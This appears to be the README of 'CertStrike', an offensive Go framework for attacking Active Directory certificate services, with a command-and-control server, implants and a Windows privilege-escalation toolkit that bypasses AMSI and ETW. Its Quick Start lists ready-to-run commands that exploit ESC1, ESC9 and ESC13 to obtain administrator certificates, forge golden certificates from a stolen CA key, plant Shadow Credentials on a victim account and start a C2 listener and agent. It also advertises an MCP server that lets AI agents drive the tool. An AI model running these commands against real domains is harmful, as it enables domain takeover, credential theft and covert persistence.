# CertStrike

ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Features

### ADCS / PKI Exploitation
- **ESC1-ESC5** vulnerability detection with automatic scoring and exploitation
- **ESC8** HTTP web enrollment relay detection (NTLM probing)
- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION detection and UPN swap exploitation
- **ESC10** Weak certificate mapping detection (CertificateMappingMethods)
- **ESC11** RPC interface encryption enforcement detection
- **ESC13** OID group link abuse via msDS-OIDToGroupLink
- **ESC14** Weak explicit mappings via altSecurityIdentities
- **ESC4 full ACE parsing** — identifies non-privileged trustees with WriteDACL/WriteOwner
- **Golden certificate forging** — sign certs with extracted CA key for persistent domain access
- **Shadow Credentials** — msDS-KeyCredentialLink attacks for PKINIT without a CA
- **Attack chain auto-detection** — enumerate, score, prioritize across all ESC paths
- Native LDAP enumeration (no ldapsearch dependency)

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management: registration, polling, command queue, result collection
- **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
- **Polling agent**: `certstrike agent --config stager.json`
- Stager and cert-auth implant configuration generation

### SmartPotato — Windows Privilege Escalation
Unified potato toolkit (JuicyPotato, RoguePotato, SweetPotato/PrintSpoofer) with real Windows implementations using `golang.org/x/sys/windows`. Named pipe impersonation, token duplication, AMSI/ETW bypass. Cross-compiles for Windows from Linux.

### Operational Tooling
- **Engagement reporting** — `certstrike pki --report --format markdown`
- **JSON output** — `--json` flag for pipeline integration
- **PFX import/export** — load and inspect PKCS12 files
- **Stealth mode** — `--stealth` for jittered LDAP queries
- **LDAPS/StartTLS** — encrypted LDAP connections
- **MCP server** — 5 tools for agentic integration
- **TUI operator console** — Bubbletea-based session management

## Quick Start

```bash
# Build
CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike

# Build SmartPotato for Windows
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe

# Enumerate all ESC vulnerabilities
./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass

# JSON output for pipeline integration
./certstrike pki --enum --json --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Exploit ESC1
./certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Exploit ESC9 (UPN swap)
./certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local \
  --attacker-dn "CN=attacker,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Exploit ESC13 (OID group link)
./certstrike pki --exploit esc13 --template LinkedPolicy --upn admin@corp.local \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Forge golden certificate (with extracted CA key)
./certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --output admin.pem

# Shadow Credentials
./certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass
./certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass
./certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Generate engagement report
./certstrike pki --report --format markdown --output findings.md \
  --target-dc dc01.corp.local --domain corp.local -u user -p pass

# C2 listener
./certstrike c2 --port 8443 --protocol https

# C2 polling agent
./certstrike agent --config stager.json

# Import and inspect PFX
./certstrike pki --import-pfx cert.pfx --pfx-password pass

# Stealth mode with LDAPS
./certstrike pki --enum --stealth --ldaps --target-dc dc01.corp.local --domain corp.local -u user -p pass

# Operator console
./certstrike console

# MCP server
./certstrike mcp
```

## Architecture

```
cmd/certstrike/         CLI entry points (cobra)
pkg/pki/                ADCS enumeration, ESC1-14 exploitation, certificate forging,
                        shadow credentials, reporting, PFX handling
pkg/c2/                 C2 listener, session management, cert-auth implants, polling agent
internal/mcp/           MCP stdio server (5 tools)
internal/tui/           Bubbletea operator console
implants/smartpotato/   Windows potato privilege escalation (build with GOOS=windows)
```

## Dependencies
All pure Go, CGO_ENABLED=0 compatible:
- `github.com/spf13/cobra` — CLI framework
- `github.com/go-ldap/ldap/v3` — Native LDAP client
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/charmbracelet/lipgloss` — TUI styling
- `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
